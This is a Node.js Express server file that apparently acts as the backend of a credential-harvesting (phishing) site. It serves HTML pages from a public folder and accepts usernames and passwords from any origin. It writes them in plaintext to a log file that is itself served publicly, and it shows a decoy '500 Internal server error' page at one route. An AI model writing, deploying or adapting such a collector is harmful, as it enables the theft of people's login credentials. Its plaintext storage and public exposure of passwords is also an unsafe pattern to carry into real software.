const express = require('express');
const path = require('path');
const app = express();
const PORT = 3000;

const fs = require('fs');
const cors = require('cors');

app.use(cors());
app.use(express.json());  

// Serve HTML files from the "public" folder
app.use(express.static(path.join(__dirname, 'public')));

app.get('/meow',(req, res)=>{
  res.send("<h1>500</h1><h3>Internal server error</h3>")
})

 
// POST API route
app.use('/logs', express.static(path.join(__dirname, 'logs')));

// Ensure logs directory exists
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
  fs.mkdirSync(logDir);
}

// API to accept data
app.post('/api/data', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).send('Missing username or password');
  }

  const logEntry = `[${new Date().toISOString()}] Username: ${username}, Password: ${password}\n`;

  fs.appendFile(path.join(logDir, 'requests.log'), logEntry, (err) => {
    if (err) {
      console.error('Log write error:', err);
      return res.status(500).send('Error logging data');
    }

    console.log('Logged:', logEntry.trim());
    res.status(200).send('Data logged successfully');
  });
});

 

// 404 for unknown routes
app.use((req, res) => {
  res.status(404).send('Page not found');
});

app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
